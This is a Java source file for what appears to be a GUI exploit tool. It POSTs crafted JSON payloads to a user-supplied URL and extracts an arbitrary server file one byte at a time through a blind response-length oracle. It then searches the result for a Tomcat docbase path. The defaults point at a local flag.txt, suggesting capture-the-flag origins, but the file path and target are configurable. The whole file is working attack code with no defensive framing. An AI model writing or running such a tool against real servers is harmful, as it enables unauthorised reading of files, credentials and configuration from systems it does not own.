package com.huarui;

import javax.swing.*;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.huarui.GUI.printToTextArea;

public class coi {
    //public void runcoi(JTextArea textArea,String text){
        //printToTextArea(textArea, "Hello, World!");
        //printToTextArea(textArea, "file: " + text);
    static String url = "http://127.0.0.1:8080/json";
    private static final int TIMEOUT = 5000;
    static String fileToRead = "file:///flag.txt";

    public void runcoi(JTextArea textArea,String text,String urltext) {
        step1(textArea);
        fileToRead = "file:///" + text;
        url = urltext;
        String docbase = step2(textArea);
        if (docbase == null) {
        } else {
            printToTextArea(textArea, "docbase: " + docbase);
        }
    }

    private static void step1(JTextArea textArea) {
        try {
            String step1Payload = readFile("payload/step1.json");
            sendJson(step1Payload,textArea);
        } catch (IOException e) {
            printToTextArea(textArea, "加载 step1.json 时出错: " + e.getMessage());
        }
    }

    private static String step2(JTextArea textArea) {
        try {
            String step2Payload = readFile("payload/step2.json");
            step2Payload = step2Payload.replace("${file}", fileToRead);

            int falseLen = sendJson(step2Payload.replace("${data}", "[1]"),textArea).length();
            boolean flag = true;
            List<Integer> result = new ArrayList<>();
            String data;
            String docbase = "";

            System.out.println("读取文件中...");
            while (flag) {
                data = resultToString(result);
                printToTextArea(textArea, data);
                System.out.println(data);

                for (int i = 0; i < 256; i++) {
                    List<Integer> tmp = new ArrayList<>(result);
                    tmp.add(i);
                    String payload = step2Payload.replace("${data}", tmp.toString());
                    String response = sendJson(payload,textArea);

                    if (response.length() != falseLen) {
                        result.add(i);
                        if (i == 0xA) {
                            printToTextArea(textArea, "[+] 检查中...");
                            System.out.println("[+] 检查中...");
                            data = resultToString(result);
                            Matcher matcher = Pattern.compile("tomcat-docbase\\.\\d+\\.\\d+").matcher(data);
                            if (matcher.find()) {
                                docbase = matcher.group();
                                printToTextArea(textArea, "[+] 找到 docbase: " + docbase);
                                System.out.println("[+] 找到 docbase: " + docbase);
                                flag = false;
                            } else {
                                printToTextArea(textArea, "[-] 未找到 docbase");
                                System.out.println("[-] 未找到 docbase");
                            }
                        }
                        break;
                    }

                    if (i == 255) {
                        flag = false;
                    }
                }
            }
            printToTextArea(textArea, "--------------------------------");
            printToTextArea(textArea, "[+] 结果: \n" + resultToString(result));
            printToTextArea(textArea, "--------------------------------");

            return docbase.isEmpty() ? null : docbase;
        } catch (IOException e) {
            System.out.println("加载 step2.json 时出错: " + e.getMessage());
            return null;
        }
    }

    private static String sendJson(String payload,JTextArea textArea) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setConnectTimeout(TIMEOUT);
            connection.setReadTimeout(TIMEOUT);
            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                os.write((payload).getBytes(StandardCharsets.UTF_8));
            }

            StringBuilder response = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
            }
            return response.toString();
        } catch (IOException e) {
            printToTextArea(textArea, "发送请求失败: " + e.getMessage());
            return "";
        }
    }

    private static String readFile(String filePath) throws IOException {
        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath, StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
        }
        return content.toString();
    }

    private static String resultToString(List<Integer> result) {
        StringBuilder data = new StringBuilder();
        for (int i : result) {
            data.append((char) i);
        }
        return data.toString();
    }




}
